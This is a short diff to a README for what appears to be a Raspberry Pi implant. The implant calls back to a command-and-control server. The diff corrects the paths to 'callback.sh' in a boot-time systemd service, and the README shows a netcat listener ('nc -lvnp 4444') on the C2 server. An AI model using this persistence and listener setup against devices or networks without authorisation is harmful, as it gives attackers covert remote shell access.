@@ -55,7 +55,7 @@ After=network-online.target
 
 [Service]
 Type=simple
-ExecStart=~/pathtoyourscript/callback.sh
+ExecStart=/pathtoyourscript/callback.sh
 Restart=on-failure
 
 [Install]
@@ -76,6 +76,6 @@ For this a simple azure vm is needed and it's pretty easy to setup. Just make su
 **C2 Server**
 - ```nc -lvnp 4444```
 
-Now all you got to do is to restart the PI and try if the script runs on boot. You can try out the script manually also if you want to without restarting ```sudo chmod +x /callback.sh``` and then ``` sudo callback.sh``` without having reboot. But always make sure that it works on the reboot afterwards.
+Now all you got to do is to restart the PI and try if the script runs on boot. You can try out the script manually also if you want to without restarting ```sudo chmod +x /callback.sh``` and then ``` sudo ./callback.sh``` without having reboot. But always make sure that it works on the reboot afterwards.
 
 
